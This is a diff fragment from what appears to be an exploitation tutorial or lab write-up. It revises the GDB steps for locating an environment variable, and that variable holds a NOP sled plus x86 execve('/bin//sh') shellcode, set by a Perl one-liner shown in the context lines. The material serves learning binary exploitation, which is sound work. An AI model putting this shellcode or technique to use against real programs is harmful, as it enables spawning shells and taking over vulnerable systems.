@@ -139,10 +139,13 @@ a large NOP sled:
 export SC=$(perl -e 'print "\x90" x 1000 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
 
-In GDB, the environment variable is around:
+In GDB, load the binary and stop at `main` before asking for the environment
+variable address:
 
 ```gdb
-p/x getenv("SC")
+break main
+run
+p/x (char *)getenv("SC")
 ```
 
 Result:
